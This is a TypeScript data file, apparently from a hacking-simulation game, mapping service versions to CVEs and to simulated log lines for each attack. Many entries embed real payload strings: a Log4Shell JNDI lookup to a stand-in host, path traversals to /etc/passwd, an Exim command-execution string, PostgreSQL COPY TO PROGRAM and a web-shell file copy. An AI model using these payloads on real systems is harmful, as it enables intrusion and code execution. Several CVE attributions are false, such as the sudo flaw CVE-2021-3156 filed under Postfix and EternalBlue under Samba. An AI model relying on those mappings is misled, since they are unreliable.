import type { Vulnerability } from '../../network/types';

export type VulnerabilityTemplate = {
  readonly port: number;
  readonly service: string;
  readonly vulnerability: Vulnerability;
};

// Phase 3 PR B: findVulnForService now takes gameTime and filters out CVEs
// that haven't been "published" yet (publishedAt > gameTime) AND CVEs with
// severity 'info' (Phase 4 activates these alongside typed effects — in PR B
// they're non-exploitable via msfconsole).
//
// Under the 1:1 (service, version) → CVE invariant, this returns either the
// single matching CVE or undefined.
//
// The gameTime argument is required to prevent accidental calls that would
// bypass the time filter. Callers that genuinely want the all-time view
// (currently: none) can pass Number.MAX_SAFE_INTEGER.
export const findVulnForService = (
  service: string,
  serviceVersion: string,
  gameTime: number,
): Vulnerability | undefined => {
  const match = vulnerabilityTemplates.find(
    (t) => t.service === service && t.vulnerability.serviceVersion === serviceVersion,
  )?.vulnerability;
  if (!match) return undefined;
  if (match.severity === 'info') return undefined;
  if (match.publishedAt > gameTime) return undefined;
  return match;
};

// Default "safe" service version used when constructing ports that shouldn't
// be exploitable. The string is deliberately chosen to never match any entry
// in vulnerabilityTemplates — i.e., findVulnForService(anyService, 'latest')
// always returns undefined. Phase 3+ can replace this with per-service
// realistic version strings (OpenSSH 9.6, Apache/2.4.59, etc.) without
// changing any consumer — they only care about lookup results.
export const DEFAULT_SERVICE_VERSION = 'latest';

export const defaultServiceVersion = (_service: string): string => DEFAULT_SERVICE_VERSION;

export const vulnerabilityTemplates: readonly VulnerabilityTemplate[] = [
  // --- HTTP / web --- (attack patterns land in /var/log/access.log)
  {
    port: 80,
    service: 'http',
    vulnerability: {
      cve: 'CVE-2021-41773',
      description: 'Apache 2.4.49 path traversal / RCE',
      serviceVersion: 'Apache/2.4.49',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/access.log',
        method: 'GET',
        path: '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        status: 500,
      },
    },
  },
  {
    port: 80,
    service: 'http',
    vulnerability: {
      cve: 'CVE-2017-7679',
      description: 'Apache mod_mime buffer overread / RCE',
      serviceVersion: 'Apache/2.4.25',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/access.log',
        method: 'GET',
        path: '/index.html',
        status: 500,
      },
    },
  },
  {
    port: 80,
    service: 'http',
    vulnerability: {
      cve: 'CVE-2019-0211',
      description: 'Apache privilege escalation via scoreboard manipulation',
      serviceVersion: 'Apache/2.4.38',
      severity: 'high',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/access.log',
        method: 'POST',
        path: '/server-status',
        status: 200,
      },
    },
  },
  {
    port: 80,
    service: 'http',
    vulnerability: {
      cve: 'CVE-2021-23017',
      description: 'nginx DNS resolver off-by-one heap write',
      serviceVersion: 'nginx/1.20.0',
      severity: 'high',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/access.log',
        method: 'GET',
        path: '/?resolver=AAAAAAAAAAAAAAAAAAAA',
        status: 502,
      },
    },
  },
  {
    port: 8080,
    service: 'http-alt',
    vulnerability: {
      cve: 'CVE-2017-5638',
      description: 'Apache Struts 2 RCE via Content-Type',
      serviceVersion: 'Struts/2.3.31',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/access.log',
        method: 'POST',
        path: '/struts2-showcase/showcase.action',
        status: 500,
      },
    },
  },
  {
    port: 8080,
    service: 'http-alt',
    vulnerability: {
      cve: 'CVE-2021-44228',
      description: 'Apache Log4j2 JNDI RCE (Log4Shell)',
      serviceVersion: 'Tomcat/9.0.40',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/access.log',
        method: 'GET',
        path: '/?x=${jndi:ldap://evil.example/a}',
        status: 200,
      },
    },
  },
  {
    port: 9200,
    service: 'elasticsearch',
    vulnerability: {
      cve: 'CVE-2015-1427',
      description: 'Elasticsearch Groovy sandbox bypass',
      serviceVersion: 'Elasticsearch 1.4.2',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/access.log',
        method: 'POST',
        path: '/_search?source={"script_fields":{"x":{"script":"exec"}}}',
        status: 200,
      },
    },
  },
  {
    port: 8443,
    service: 'https',
    vulnerability: {
      cve: 'CVE-2019-11510',
      description: 'Pulse Secure VPN arbitrary file read',
      serviceVersion: 'PulseSecure/9.0R1',
      severity: 'high',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/access.log',
        method: 'GET',
        path: '/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/',
        status: 200,
      },
    },
  },
  // --- FTP --- (attack patterns land in /var/log/vsftpd.log)
  {
    port: 21,
    service: 'ftp',
    vulnerability: {
      cve: 'CVE-2011-2523',
      description: 'vsftpd 2.3.4 backdoor command execution',
      serviceVersion: 'vsftpd 2.3.4',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/vsftpd.log',
        command: 'USER user:)',
      },
    },
  },
  {
    port: 21,
    service: 'ftp',
    vulnerability: {
      cve: 'CVE-2015-3306',
      description: 'ProFTPD mod_copy unauthenticated file copy / RCE',
      serviceVersion: 'ProFTPD 1.3.5',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/vsftpd.log',
        command: 'SITE CPFR /etc/passwd',
      },
    },
  },
  {
    port: 21,
    service: 'ftp',
    vulnerability: {
      cve: 'CVE-2019-12815',
      description: 'ProFTPD mod_copy arbitrary file copy (unauthenticated)',
      serviceVersion: 'ProFTPD 1.3.6',
      severity: 'high',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/vsftpd.log',
        command: 'SITE CPTO /var/www/html/shell.php',
      },
    },
  },
  // --- MySQL / MariaDB --- (attack patterns land in /var/log/mysql.log)
  {
    port: 3306,
    service: 'mysql',
    vulnerability: {
      cve: 'CVE-2012-2122',
      description: 'MySQL auth bypass (memcmp timing)',
      serviceVersion: 'MySQL 5.5.23',
      severity: 'high',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/mysql.log',
        query: 'Connect\troot@ using password: repeated-invalid',
      },
    },
  },
  {
    port: 3306,
    service: 'mysql',
    vulnerability: {
      cve: 'CVE-2016-6662',
      description: 'MySQL remote root code execution via config manipulation',
      serviceVersion: 'MySQL 5.5.52',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/mysql.log',
        query: "SET GLOBAL general_log_file = '/var/lib/mysql/malicious.so'",
      },
    },
  },
  {
    port: 3306,
    service: 'mysql',
    vulnerability: {
      cve: 'CVE-2021-27928',
      description: 'MariaDB wsrep provider RCE via crafted SET GLOBAL',
      serviceVersion: 'MariaDB 10.5.8',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/mysql.log',
        query: "SET GLOBAL wsrep_provider = '/tmp/payload.so'",
      },
    },
  },
  // --- Redis --- (attack patterns land in /var/log/redis.log)
  {
    port: 6379,
    service: 'redis',
    vulnerability: {
      cve: 'CVE-2022-0543',
      description: 'Redis Lua sandbox escape / RCE',
      serviceVersion: 'Redis 5.0.7',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/redis.log',
        message: 'Lua script called unexpected C function: os.execute',
      },
    },
  },
  {
    port: 6379,
    service: 'redis',
    vulnerability: {
      cve: 'CVE-2015-4335',
      description: 'Redis Lua sandbox escape via eval',
      serviceVersion: 'Redis 2.8.19',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/redis.log',
        message: 'EVAL called with dofile sandbox bypass attempt',
      },
    },
  },
  // --- Mail (SMTP / IMAP / POP3) --- (attack patterns land in /var/log/mail.log)
  {
    port: 25,
    service: 'smtp',
    vulnerability: {
      cve: 'CVE-2019-10149',
      description: 'Exim 4.87-4.91 RCE (The Return of WIZard)',
      serviceVersion: 'Exim 4.87',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/mail.log',
        daemon: 'postfix/smtpd',
        message: 'warning: rejected RCPT TO:<${run{/bin/sh -c "id"}}@localhost>',
      },
    },
  },
  {
    port: 25,
    service: 'smtp',
    vulnerability: {
      cve: 'CVE-2010-4344',
      description: 'Exim heap overflow remote code execution',
      serviceVersion: 'Exim 4.69',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/mail.log',
        daemon: 'postfix/smtpd',
        message: 'error: EHLO from unknown: message header exceeds buffer',
      },
    },
  },
  {
    port: 25,
    service: 'smtp',
    vulnerability: {
      cve: 'CVE-2021-3156',
      description: 'Postfix SMTP baron samedit heap overflow via MAIL FROM',
      serviceVersion: 'Postfix 3.4.8',
      severity: 'high',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/mail.log',
        daemon: 'postfix/smtpd',
        message: 'warning: malformed MAIL FROM:<...> heap corruption detected',
      },
    },
  },
  {
    port: 143,
    service: 'imap',
    vulnerability: {
      cve: 'CVE-2019-11500',
      description: 'Dovecot IMAP/POP3 buffer overflow',
      serviceVersion: 'Dovecot 2.3.7',
      severity: 'high',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/mail.log',
        daemon: 'dovecot',
        message: 'imap-login: Disconnected (auth failed, 1 attempts): buffer overflow',
      },
    },
  },
  {
    port: 110,
    service: 'pop3',
    vulnerability: {
      cve: 'CVE-2017-15130',
      description: 'Dovecot POP3 denial-of-service via crafted RETR',
      serviceVersion: 'Dovecot 2.2.33',
      severity: 'medium',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/mail.log',
        daemon: 'dovecot',
        message: 'pop3-login: Fatal: master(pop3-login): service(pop3-login) crashed',
      },
    },
  },
  {
    port: 110,
    service: 'pop3',
    vulnerability: {
      cve: 'CVE-2019-3467',
      description: 'Courier POP3 buffer overflow / privilege escalation',
      serviceVersion: 'Courier 0.75.0',
      severity: 'high',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/mail.log',
        daemon: 'courier',
        message: 'pop3d: stack overflow in parse_command(), aborting',
      },
    },
  },
  // --- Everything else --- (attack patterns land in /var/log/syslog with daemon tag)
  {
    port: 1883,
    service: 'mqtt',
    vulnerability: {
      cve: 'CVE-2023-3028',
      description: 'Mosquitto MQTT broker auth bypass',
      serviceVersion: 'Mosquitto 2.0.14',
      severity: 'high',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'mosquitto',
        message: 'New client connected from without authentication (auth bypass)',
      },
    },
  },
  {
    port: 1883,
    service: 'mqtt',
    vulnerability: {
      cve: 'CVE-2017-7650',
      description: 'Mosquitto pattern-based ACL bypass',
      serviceVersion: 'Mosquitto 1.4.12',
      severity: 'medium',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'mosquitto',
        message: 'ACL bypass detected: client subscribed to $SYS/# without permission',
      },
    },
  },
  {
    port: 445,
    service: 'smb',
    vulnerability: {
      cve: 'CVE-2017-0144',
      description: 'SMB remote code execution (EternalBlue)',
      serviceVersion: 'Samba 4.5.9',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'smbd',
        message: 'SMB1 Trans2 OS2 FEA_LIST buffer overflow attempt',
      },
    },
  },
  {
    port: 5432,
    service: 'postgresql',
    vulnerability: {
      cve: 'CVE-2019-9193',
      description: 'PostgreSQL COPY TO/FROM PROGRAM RCE',
      serviceVersion: 'PostgreSQL 9.3',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'postgres',
        message: "statement: COPY (SELECT '') TO PROGRAM '/bin/sh -c id'",
      },
    },
  },
  {
    port: 5432,
    service: 'postgresql',
    vulnerability: {
      cve: 'CVE-2023-5868',
      description: 'PostgreSQL aggregate function memory disclosure',
      serviceVersion: 'PostgreSQL 13.10',
      severity: 'low',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'postgres',
        message: 'statement: SELECT array_agg(ctid) FROM pg_catalog.pg_authid',
      },
    },
  },
  {
    port: 27017,
    service: 'mongodb',
    vulnerability: {
      cve: 'CVE-2020-7921',
      description: 'MongoDB auth bypass via crafted roleInfo command',
      serviceVersion: 'MongoDB 3.6.12',
      severity: 'high',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'mongod',
        message: 'auth: unauthorized roleInfo command accepted (auth bypass)',
      },
    },
  },
  {
    port: 27017,
    service: 'mongodb',
    vulnerability: {
      cve: 'CVE-2019-2390',
      description: 'MongoDB BSON deserialization RCE via crafted document',
      serviceVersion: 'MongoDB 4.0.5',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'mongod',
        message: 'BSON deserialization error: invalid object id triggered RCE path',
      },
    },
  },
  {
    port: 873,
    service: 'rsync',
    vulnerability: {
      cve: 'CVE-2022-29154',
      description: 'rsync arbitrary file write via path validation bypass',
      serviceVersion: 'rsync 3.2.3',
      severity: 'high',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'rsyncd',
        message: 'rsync: path validation bypass — file written outside module root',
      },
    },
  },
  {
    port: 873,
    service: 'rsync',
    vulnerability: {
      cve: 'CVE-2024-12084',
      description: 'rsync heap buffer overflow via checksum parsing',
      serviceVersion: 'rsync 3.2.7',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'rsyncd',
        message: 'rsync: heap buffer overflow parsing checksum header',
      },
    },
  },
  {
    port: 5900,
    service: 'vnc',
    vulnerability: {
      cve: 'CVE-2019-15681',
      description: 'TightVNC heap buffer overflow / info leak',
      serviceVersion: 'TightVNC 1.3.10',
      severity: 'high',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'xvnc',
        message: 'TightVNC: heap buffer overflow in rectangle rendering',
      },
    },
  },
  {
    port: 5900,
    service: 'vnc',
    vulnerability: {
      cve: 'CVE-2006-2369',
      description: 'RealVNC authentication bypass via null auth type',
      serviceVersion: 'RealVNC 4.1.1',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'vncserver',
        message: 'security type None accepted from client (auth bypass)',
      },
    },
  },
  {
    port: 502,
    service: 'modbus',
    vulnerability: {
      cve: 'CVE-2022-2003',
      description: 'AutomationDirect Modbus unauthenticated write to PLC registers',
      serviceVersion: 'ModbusTCP 1.0',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'modbusd',
        message: 'unauthenticated WRITE_MULTIPLE_REGISTERS to holding register 0x0000',
      },
    },
  },
  {
    port: 502,
    service: 'modbus',
    vulnerability: {
      cve: 'CVE-2019-9560',
      description: 'Schneider Modbus gateway unauthenticated admin access',
      serviceVersion: 'Modicon M340',
      severity: 'critical',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'modbusd',
        message: 'admin command accepted from unauthenticated peer',
      },
    },
  },
  {
    port: 1194,
    service: 'openvpn',
    vulnerability: {
      cve: 'CVE-2017-12166',
      description: 'OpenVPN buffer overflow in key-method negotiation',
      serviceVersion: 'OpenVPN 2.4.3',
      severity: 'high',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'openvpn',
        message: 'key-method 1 overflow — malformed negotiation packet',
      },
    },
  },
  {
    port: 1194,
    service: 'openvpn',
    vulnerability: {
      cve: 'CVE-2020-15078',
      description: 'OpenVPN auth bypass via deferred auth plugin',
      serviceVersion: 'OpenVPN 2.5.1',
      severity: 'high',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'openvpn',
        message: 'deferred auth accepted without credentials (auth bypass)',
      },
    },
  },
  {
    port: 53,
    service: 'dns',
    vulnerability: {
      cve: 'CVE-2021-25220',
      description: 'BIND 9.16 cache poisoning via forwarder response injection',
      serviceVersion: 'BIND 9.16.18',
      severity: 'medium',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'named',
        message: 'cache poisoning attempt: forwarder response mismatch',
      },
    },
  },
  {
    port: 53,
    service: 'dns',
    vulnerability: {
      cve: 'CVE-2020-8617',
      description: 'BIND TSIG assertion failure causes remote DoS',
      serviceVersion: 'BIND 9.14.11',
      severity: 'medium',
      publishedAt: 0,
      attackPattern: {
        logFile: '/var/log/syslog',
        daemon: 'named',
        message: 'assertion failure in TSIG verification (DoS)',
      },
    },
  },
];
